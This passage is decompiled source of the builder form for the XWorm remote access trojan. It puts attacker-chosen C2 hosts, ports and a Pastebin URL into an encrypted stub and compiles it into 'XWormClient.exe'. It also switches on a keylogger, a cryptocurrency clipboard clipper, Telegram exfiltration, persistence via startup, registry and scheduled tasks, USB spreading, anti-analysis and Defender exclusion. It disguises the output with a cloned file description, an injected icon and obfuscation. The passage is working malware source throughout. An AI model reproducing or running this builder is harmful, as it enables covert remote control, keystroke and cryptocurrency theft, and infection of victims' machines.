				bool flag17 = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Key", null), null, false)));
				if (flag17)
				{
					this.Guna2TextBox1.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Key", null));
				}
				bool flag18 = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Group", null), null, false)));
				if (flag18)
				{
					this.Guna2TextBox7.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Group", null));
				}
				bool flag19 = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Url", null), null, false)));
				if (flag19)
				{
					this.Guna2TextBox4.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Url", null));
				}
				bool flag20 = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Sleep", null), null, false)));
				if (flag20)
				{
					this.Guna2NumericUpDown1.Value = new decimal(Convert.ToInt32(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Sleep", null))));
				}
				bool flag21 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "Pastebin", null), "True", false);
				if (flag21)
				{
					this.Guna2TextBox2.Enabled = false;
					this.ListBox1.Enabled = false;
					this.Guna2TextBox3.Enabled = false;
					this.Guna2CheckBox3.Checked = true;
					this.Guna2TextBox4.Enabled = true;
				}
				else
				{
					this.Guna2TextBox2.Enabled = true;
					this.ListBox1.Enabled = true;
					this.Guna2TextBox3.Enabled = true;
					this.Guna2CheckBox3.Checked = false;
					this.Guna2TextBox4.Enabled = false;
				}
				bool flag22 = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "USBN", null), null, false)));
				if (flag22)
				{
					this.Guna2TextBox6.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "USBN", null));
				}
				bool flag23 = Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "USBE", null), "True", false);
				if (flag23)
				{
					this.Guna2CheckBox8.Checked = true;
					this.Guna2TextBox6.Enabled = true;
				}
				else
				{
					this.Guna2CheckBox8.Checked = false;
					this.Guna2TextBox6.Enabled = false;
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600021E RID: 542 RVA: 0x00013DC8 File Offset: 0x00011FC8
		public void Compiler(string Path, string Code)
		{
			try
			{
				VBCodeProvider vbcodeProvider = new VBCodeProvider(new Dictionary<string, string>
				{
					{
						"CompilerVersion",
						"v4.0"
					}
				});
				CompilerParameters compilerParameters = new CompilerParameters();
				string compilerOptions = " /target:winexe /platform:anycpu /nowarn";
				CompilerParameters compilerParameters2 = compilerParameters;
				compilerParameters2.GenerateExecutable = true;
				compilerParameters2.OutputAssembly = Path;
				compilerParameters2.CompilerOptions = compilerOptions;
				compilerParameters2.IncludeDebugInformation = false;
				compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll");
				compilerParameters2.ReferencedAssemblies.Add("System.dll");
				compilerParameters2.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
				compilerParameters2.ReferencedAssemblies.Add("System.Management.dll");
				compilerParameters2.ReferencedAssemblies.Add("System.Drawing.dll");
				compilerParameters2.ReferencedAssemblies.Add("System.Core.dll");
				CompilerResults compilerResults = vbcodeProvider.CompileAssemblyFromSource(compilerParameters, new string[]
				{
					Code
				});
				bool flag = compilerResults.Errors.Count > 0;
				if (flag)
				{
					try
					{
						IEnumerator enumerator = compilerResults.Errors.GetEnumerator();
						if (enumerator.MoveNext())
						{
							object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
							Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "ErrorText", new object[0], null, null, null)), MsgBoxStyle.Critical, null);
							return;
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				bool @checked = this.Guna2CheckBox2.Checked;
				if (@checked)
				{
					IconInjector.InjectIcon(Path, this.iconpath);
				}
				bool checked2 = this.Guna2CheckBox4.Checked;
				if (checked2)
				{
					Debug.WriteLine(Obfuscator.Save(File.ReadAllBytes(Path), Path));
				}
				GC.Collect();
				FileInfo fileInfo = new FileInfo(Path);
				base.Hide();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600021F RID: 543 RVA: 0x00013FE4 File Offset: 0x000121E4
		public object Encrypt(string input, string Pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = new byte[32];
			byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(this.SBUTF8(Pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] array2 = this.SBUTF8(input);
			return Convert.ToBase64String(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
		}

		// Token: 0x06000220 RID: 544 RVA: 0x00014074 File Offset: 0x00012274
		private byte[] SBUTF8(string s)
		{
			return Encoding.UTF8.GetBytes(s);
		}

		// Token: 0x06000221 RID: 545 RVA: 0x00014094 File Offset: 0x00012294
		private void Guna2CheckBox8_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.Guna2CheckBox8.Checked;
			if (@checked)
			{
				this.Guna2TextBox6.Enabled = true;
			}
			else
			{
				this.Guna2TextBox6.Enabled = false;
			}
		}

		// Token: 0x06000222 RID: 546 RVA: 0x000140D0 File Offset: 0x000122D0
		private void Guna2CheckBox2_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = this.xform2;
			if (flag)
			{
				this.xform2 = false;
			}
			else
			{
				bool @checked = this.Guna2CheckBox2.Checked;
				if (@checked)
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					OpenFileDialog openFileDialog2 = openFileDialog;
					openFileDialog2.Filter = "(*.exe;*.ico;)|*.exe;*.ico";
					openFileDialog2.InitialDirectory = Application.StartupPath + "\\Icons";
					bool flag2 = openFileDialog.ShowDialog() == DialogResult.OK;
					if (flag2)
					{
						bool flag3 = openFileDialog.FileName.EndsWith(".exe");
						if (flag3)
						{
							this.iconpath = Helper.GetIcon(openFileDialog.FileName);
							this.PictureBox1.ImageLocation = this.iconpath;
							GC.Collect();
						}
						else
						{
							this.iconpath = openFileDialog.FileName;
							this.PictureBox1.ImageLocation = this.iconpath;
						}
					}
					else
					{
						this.iconpath = null;
						this.PictureBox1.Image = null;
						this.Guna2CheckBox2.Checked = false;
					}
				}
				bool flag4 = !this.Guna2CheckBox2.Checked;
				if (flag4)
				{
					this.iconpath = null;
					this.PictureBox1.Image = null;
					this.Guna2CheckBox2.Checked = false;
				}
			}
		}

		// Token: 0x06000223 RID: 547 RVA: 0x00014208 File Offset: 0x00012408
		private void Guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = this.xform;
			if (flag)
			{
				this.xform = false;
			}
			else
			{
				bool @checked = this.Guna2CheckBox1.Checked;
				if (@checked)
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					OpenFileDialog openFileDialog2 = openFileDialog;
					openFileDialog2.Filter = "(*.exe|*.exe";
					bool flag2 = openFileDialog.ShowDialog() == DialogResult.OK;
					if (flag2)
					{
						this.assm = openFileDialog.FileName;
						this.Guna2CheckBox1.Checked = true;
					}
					else
					{
						this.assm = null;
						this.Guna2CheckBox1.Checked = false;
					}
				}
				bool flag3 = !this.Guna2CheckBox1.Checked;
				if (flag3)
				{
					this.assm = null;
					this.Guna2CheckBox1.Checked = false;
				}
			}
		}

		// Token: 0x06000224 RID: 548 RVA: 0x000142C4 File Offset: 0x000124C4
		private void Guna2CheckBox3_CheckedChanged(object sender, EventArgs e)
		{
			bool @checked = this.Guna2CheckBox3.Checked;
			if (@checked)
			{
				this.Guna2TextBox2.Enabled = false;
				this.ListBox1.Enabled = false;
				this.Guna2TextBox3.Enabled = false;
				this.Guna2TextBox4.Enabled = true;
			}
			else
			{
				this.Guna2TextBox2.Enabled = true;
				this.ListBox1.Enabled = true;
				this.Guna2TextBox3.Enabled = true;
				this.Guna2TextBox4.Enabled = false;
			}
		}

		// Token: 0x06000225 RID: 549 RVA: 0x00014350 File Offset: 0x00012550
		private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Guna2TextBox1.Text.Length > 32 | this.Guna2TextBox1.Text.Length < 1;
				if (flag)
				{
					this.Guna2GradientButton1.Enabled = false;
				}
				else
				{
					this.Guna2GradientButton1.Enabled = true;
				}
			}
			catch (Exception ex)
			{
				this.Guna2GradientButton1.Enabled = false;
			}
		}

		// Token: 0x06000226 RID: 550 RVA: 0x000143DC File Offset: 0x000125DC
		private void Guna2TextBox2_KeyDown(object sender, KeyEventArgs e)
		{
			try
			{
				bool flag = e.KeyCode == Keys.Return;
				if (flag)
				{
					e.SuppressKeyPress = true;
					bool flag2 = !string.IsNullOrEmpty(this.Guna2TextBox2.Text);
					if (flag2)
					{
						bool flag3 = !this.ListBox1.Items.Contains(this.Guna2TextBox2.Text) || string.IsNullOrEmpty(this.Guna2TextBox2.Text);
						if (flag3)
						{
							this.ListBox1.Items.Add(this.Guna2TextBox2.Text);
							this.Guna2TextBox2.Clear();
						}
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000227 RID: 551 RVA: 0x000144AC File Offset: 0x000126AC
		private void Guna2TextBox3_TextChanged(object sender, EventArgs e)
		{
			try
			{
				int num = Conversions.ToInteger(this.Guna2TextBox3.Text);
				bool flag = Conversions.ToInteger(this.Guna2TextBox3.Text) > 65534 | Conversions.ToInteger(this.Guna2TextBox3.Text) < 1;
				if (flag)
				{
					this.Guna2GradientButton1.Enabled = false;
				}
				else
				{
					this.Guna2GradientButton1.Enabled = true;
				}
			}
			catch (Exception ex)
			{
				this.Guna2GradientButton1.Enabled = false;
			}
		}

		// Token: 0x06000228 RID: 552 RVA: 0x0001454C File Offset: 0x0001274C
		private void Guna2CheckBox6_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = this.Guna2CheckBox6.Checked | this.Guna2CheckBox5.Checked | this.Guna2CheckBox7.Checked;
			if (flag)
			{
				this.Guna2ComboBox2.Enabled = true;
				this.Guna2TextBox5.Enabled = true;
			}
			else
			{
				this.Guna2ComboBox2.Enabled = false;
				this.Guna2TextBox5.Enabled = false;
			}
		}

		// Token: 0x06000229 RID: 553 RVA: 0x000145BC File Offset: 0x000127BC
		private void Guna2CheckBox5_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = this.Guna2CheckBox5.Checked | this.Guna2CheckBox6.Checked | this.Guna2CheckBox7.Checked;
			if (flag)
			{
				this.Guna2ComboBox2.Enabled = true;
				this.Guna2TextBox5.Enabled = true;
			}
			else
			{
				this.Guna2ComboBox2.Enabled = false;
				this.Guna2TextBox5.Enabled = false;
			}
		}

		// Token: 0x0600022A RID: 554 RVA: 0x0001462C File Offset: 0x0001282C
		private void Guna2CheckBox7_CheckedChanged(object sender, EventArgs e)
		{
			bool flag = this.Guna2CheckBox7.Checked | this.Guna2CheckBox6.Checked | this.Guna2CheckBox5.Checked;
			if (flag)
			{
				this.Guna2ComboBox2.Enabled = true;
				this.Guna2TextBox5.Enabled = true;
			}
			else
			{
				this.Guna2ComboBox2.Enabled = false;
				this.Guna2TextBox5.Enabled = false;
			}
		}

		// Token: 0x0600022B RID: 555 RVA: 0x0001469C File Offset: 0x0001289C
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			bool flag = this.ListBox1.Items.Count > 0 | this.Guna2CheckBox3.Checked;
			checked
			{
				if (flag)
				{
					string text = "";
					try
					{
						SaveFileDialog saveFileDialog = new SaveFileDialog
						{
							Filter = "(*.exe)|*.exe",
							OverwritePrompt = false,
							FileName = "XWormClient.exe"
						};
						bool flag2 = saveFileDialog.ShowDialog() == DialogResult.OK;
						if (flag2)
						{
							try
							{
								bool flag3 = this.ListBox1.Items.Count > 0;
								if (flag3)
								{
									try
									{
										foreach (object obj in this.ListBox1.Items)
										{
											object objectValue = RuntimeHelpers.GetObjectValue(obj);
											text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(objectValue, ",")));
										}
									}
									finally
									{
										IEnumerator enumerator;
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Hosts", text);
								}
								MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Port", this.Guna2TextBox3.Text);
								MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Key", this.Guna2TextBox1.Text);
								MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Group", this.Guna2TextBox7.Text);
								MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "USBN", this.Guna2TextBox6.Text);
								MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Url", this.Guna2TextBox4.Text);
								MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Sleep", this.Guna2NumericUpDown1.Value.ToString());
								bool @checked = this.Guna2CheckBox6.Checked;
								if (@checked)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Startup", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Startup", "False");
								}
								bool checked2 = this.Guna2CheckBox5.Checked;
								if (checked2)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Reg", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Reg", "False");
								}
								bool checked3 = this.Guna2CheckBox7.Checked;
								if (checked3)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Task", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Task", "False");
								}
								bool flag4 = this.Guna2CheckBox6.Checked | this.Guna2CheckBox5.Checked | this.Guna2CheckBox7.Checked;
								if (flag4)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "InstallDir", this.Guna2ComboBox2.SelectedIndex.ToString());
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "InstallDir", "False");
								}
								MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "InstallStr", this.Guna2TextBox5.Text);
								bool checked4 = this.Guna2ToggleSwitch1.Checked;
								if (checked4)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Analysis", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Analysis", "False");
								}
								bool checked5 = this.Guna2CheckBox8.Checked;
								if (checked5)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "USBE", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "USBE", "False");
								}
								bool flag5 = Operators.CompareString(this.assm, null, false) == 0;
								if (flag5)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Assembly", "False");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Assembly", this.assm);
								}
								bool flag6 = Operators.CompareString(this.iconpath, null, false) == 0;
								if (flag6)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Icon", "False");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Icon", this.iconpath);
								}
								bool checked6 = this.Guna2ToggleSwitch6.Checked;
								if (checked6)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Clipper", "True");
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "BTC", this.BTC);
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "ETH", this.ETH);
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "TRC20", this.TRC20);
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Clipper", "False");
								}
								bool checked7 = this.Guna2ToggleSwitch5.Checked;
								if (checked7)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "TBotNotify", "True");
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "BotToken", this.BotToken);
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Botid", this.Botid);
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "TBotNotify", "False");
								}
								bool checked8 = this.Guna2CheckBox3.Checked;
								if (checked8)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Pastebin", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Pastebin", "False");
								}
								bool checked9 = this.Guna2ToggleSwitch2.Checked;
								if (checked9)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Keylogger", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Keylogger", "False");
								}
								bool checked10 = this.Guna2ToggleSwitch3.Checked;
								if (checked10)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "AntiKill", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "AntiKill", "False");
								}
								bool checked11 = this.Guna2ToggleSwitch4.Checked;
								if (checked11)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "WDEX", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "WDEX", "False");
								}
								bool checked12 = this.Guna2CheckBox4.Checked;
								if (checked12)
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Obfuscator", "True");
								}
								else
								{
									MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "Obfuscator", "False");
								}
							}
							catch (Exception ex)
							{
								Debug.WriteLine(ex.Message);
							}
							string text2 = Resources.Stub;
							string text3 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
							StringBuilder stringBuilder = new StringBuilder();
							Random random = new Random();
							int num = 1;
							do
							{
								int index = random.Next(0, text3.Length);
								char value = text3[index];
								stringBuilder.Append(value);
								num++;
							}
							while (num <= 16);
							string text4 = stringBuilder.ToString();
							text2 = text2.Replace("%Mutex%", text4);
							text2 = text2.Replace("%USB%", Conversions.ToString(this.Encrypt(this.Guna2TextBox6.Text, text4)));
							bool checked13 = this.Guna2CheckBox3.Checked;
							if (checked13)
							{
								text2 = Strings.Replace(text2, "#Const Pastebin = False", "#Const Pastebin = True", 1, -1, CompareMethod.Binary);
								text2 = text2.Replace("%PasteUrl%", Conversions.ToString(this.Encrypt(this.Guna2TextBox4.Text, text4)));
							}
							else
							{
								text2 = text2.Replace("%Hosts%", Conversions.ToString(this.Encrypt(text.Trim().Substring(0, text.Length - 1), text4)));
								text2 = text2.Replace("%Port%", Conversions.ToString(this.Encrypt(this.Guna2TextBox3.Text, text4)));
							}
							text2 = text2.Replace("%KEY%", Conversions.ToString(this.Encrypt(this.Guna2TextBox1.Text, text4)));
							text2 = text2.Replace("%Group%", Conversions.ToString(this.Encrypt(this.Guna2TextBox7.Text, text4)));
							text2 = text2.Replace("%SPL%", Conversions.ToString(this.Encrypt("<XWormmm>", text4)));
							text2 = text2.Replace("%Sleep%", this.Guna2NumericUpDown1.Value.ToString());
							bool checked14 = this.Guna2CheckBox8.Checked;
							if (checked14)
							{
								text2 = Strings.Replace(text2, "#Const USBLNK = False", "#Const USBLNK = True", 1, -1, CompareMethod.Binary);
							}
							bool checked15 = this.Guna2CheckBox6.Checked;
							if (checked15)
							{
								text2 = Strings.Replace(text2, "#Const Startup = False", "#Const Startup = True", 1, -1, CompareMethod.Binary);
							}
							bool checked16 = this.Guna2CheckBox7.Checked;
							if (checked16)
							{
								text2 = Strings.Replace(text2, "#Const Schtasks = False", "#Const Schtasks = True", 1, -1, CompareMethod.Binary);
							}
							bool checked17 = this.Guna2CheckBox5.Checked;
							if (checked17)
							{
								text2 = Strings.Replace(text2, "#Const RegAdd = False", "#Const RegAdd = True", 1, -1, CompareMethod.Binary);
							}
							bool checked18 = this.Guna2ToggleSwitch1.Checked;
							if (checked18)
							{
								text2 = Strings.Replace(text2, "#Const Analysis = False", "#Const Analysis = True", 1, -1, CompareMethod.Binary);
							}
							bool flag7 = this.Guna2CheckBox6.Checked | this.Guna2CheckBox5.Checked | this.Guna2CheckBox7.Checked;
							if (flag7)
							{
								text2 = Strings.Replace(text2, "%Path%", Conversions.ToString(this.Encrypt(this.Guna2ComboBox2.Text, text4)), 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Name%", Conversions.ToString(this.Encrypt(this.Guna2TextBox5.Text, text4)), 1, -1, CompareMethod.Binary);
							}
							bool checked19 = this.Guna2ToggleSwitch6.Checked;
							if (checked19)
							{
								text2 = Strings.Replace(text2, "#Const Clipper = False", "#Const Clipper = True", 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%BTC%", Conversions.ToString(this.Encrypt(this.BTC, text4)), 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%ETH%", Conversions.ToString(this.Encrypt(this.ETH, text4)), 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Trc20%", Conversions.ToString(this.Encrypt(this.TRC20, text4)), 1, -1, CompareMethod.Binary);
							}
							bool checked20 = this.Guna2ToggleSwitch5.Checked;
							if (checked20)
							{
								text2 = Strings.Replace(text2, "#Const TelegramBot = False", "#Const TelegramBot = True", 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Token%", Conversions.ToString(this.Encrypt(this.BotToken, text4)), 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%ChatID%", Conversions.ToString(this.Encrypt(this.Botid, text4)), 1, -1, CompareMethod.Binary);
							}
							bool checked21 = this.Guna2ToggleSwitch2.Checked;
							if (checked21)
							{
								text2 = Strings.Replace(text2, "#Const Logger = False", "#Const Logger = True", 1, -1, CompareMethod.Binary);
							}
							bool checked22 = this.Guna2ToggleSwitch3.Checked;
							if (checked22)
							{
								text2 = Strings.Replace(text2, "#Const BDOS = False", "#Const BDOS = True", 1, -1, CompareMethod.Binary);
							}
							bool checked23 = this.Guna2ToggleSwitch4.Checked;
							if (checked23)
							{
								text2 = Strings.Replace(text2, "#Const WDEX = False", "#Const WDEX = True", 1, -1, CompareMethod.Binary);
							}
							bool checked24 = this.Guna2CheckBox1.Checked;
							if (checked24)
							{
								FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(this.assm);
								text2 = Strings.Replace(text2, "%Title%", versionInfo.FileDescription, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Des%", versionInfo.Comments, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Company%", versionInfo.CompanyName, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Product%", versionInfo.ProductName, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Copyright%", versionInfo.LegalCopyright, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Trademark%", versionInfo.LegalTrademarks, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Guid%", Guid.NewGuid().ToString(), 1, -1, CompareMethod.Binary);
								text2 = text2.Replace("%v1%", versionInfo.FileMajorPart.ToString());
								text2 = text2.Replace("%v2%", versionInfo.FileMinorPart.ToString());
								text2 = text2.Replace("%v3%", versionInfo.FileBuildPart.ToString());
								text2 = text2.Replace("%v4%", versionInfo.FilePrivatePart.ToString());
							}
							else
							{
								text2 = Strings.Replace(text2, "%Title%", null, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Des%", null, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Company%", null, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Product%", null, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Copyright%", null, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Trademark%", null, 1, -1, CompareMethod.Binary);
								text2 = Strings.Replace(text2, "%Guid%", Guid.NewGuid().ToString(), 1, -1, CompareMethod.Binary);
								text2 = text2.Replace("%v1%", Conversions.ToString(1));
								text2 = text2.Replace("%v2%", Conversions.ToString(0));
								text2 = text2.Replace("%v3%", Conversions.ToString(0));
								text2 = text2.Replace("%v4%", Conversions.ToString(0));
							}
							this.Compiler(saveFileDialog.FileName, text2);
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
		}

		// Token: 0x0600022C RID: 556 RVA: 0x000155D0 File Offset: 0x000137D0
		private void Guna2ToggleSwitch5_MouseClick(object sender, MouseEventArgs e)
		{
			bool @checked = this.Guna2ToggleSwitch5.Checked;
			if (@checked)
			{
				using (TBotNotify tbotNotify = new TBotNotify())
				{
					tbotNotify.StartPosition = FormStartPosition.Manual;
					tbotNotify.StartPosition = FormStartPosition.CenterParent;
					bool flag = tbotNotify.ShowDialog() == DialogResult.OK;
					if (flag)
					{
						this.BotToken = tbotNotify.Guna2TextBox1.Text;
						this.Botid = tbotNotify.Guna2TextBox2.Text;
					}
					else
					{
						this.Guna2ToggleSwitch5.Checked = false;
						this.BotToken = null;
						this.Botid = null;
					}
				}
			}
		}

		// Token: 0x0600022D RID: 557 RVA: 0x00015674 File Offset: 0x00013874
		private void Guna2ToggleSwitch6_MouseClick(object sender, MouseEventArgs e)
		{
			bool @checked = this.Guna2ToggleSwitch6.Checked;
			if (@checked)
			{
				using (Clipper clipper = new Clipper())
				{
					clipper.StartPosition = FormStartPosition.Manual;
					clipper.StartPosition = FormStartPosition.CenterParent;
					bool flag = clipper.ShowDialog() == DialogResult.OK;
					if (flag)
					{
						this.BTC = clipper.Guna2TextBox1.Text;
						this.ETH = clipper.Guna2TextBox2.Text;
						this.TRC20 = clipper.Guna2TextBox3.Text;
					}
					else
					{
						this.Guna2ToggleSwitch6.Checked = false;
						this.BTC = null;
						this.ETH = null;
						this.TRC20 = null;
					}
				}
			}
		}

		// Token: 0x0600022E RID: 558 RVA: 0x00015734 File Offset: 0x00013934
		private void Guna2TextBox2_IconRightClick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !string.IsNullOrEmpty(this.Guna2TextBox2.Text);
				if (flag)
				{
					bool flag2 = !this.ListBox1.Items.Contains(this.Guna2TextBox2.Text);
					if (flag2)
					{
						this.ListBox1.Items.Add(this.Guna2TextBox2.Text);
						this.Guna2TextBox2.Clear();
					}
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600022F RID: 559 RVA: 0x000157D8 File Offset: 0x000139D8
		private void Guna2TextBox2_IconLeftClick(object sender, EventArgs e)
		{
			try
			{
				this.ListBox1.Items.Remove(RuntimeHelpers.GetObjectValue(this.ListBox1.SelectedItem));
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x040000DF RID: 223
		public string iconpath;

		// Token: 0x040000E0 RID: 224
		public string assm;

		// Token: 0x040000E1 RID: 225
		public bool xform;

		// Token: 0x040000E2 RID: 226
		public bool xform2;

		// Token: 0x040000E3 RID: 227
		public string Botid;

		// Token: 0x040000E4 RID: 228
		public string BotToken;

		// Token: 0x040000E5 RID: 229
		public string BTC;

		// Token: 0x040000E6 RID: 230
		public string ETH;

		// Token: 0x040000E7 RID: 231
		public string TRC20;
	}
}
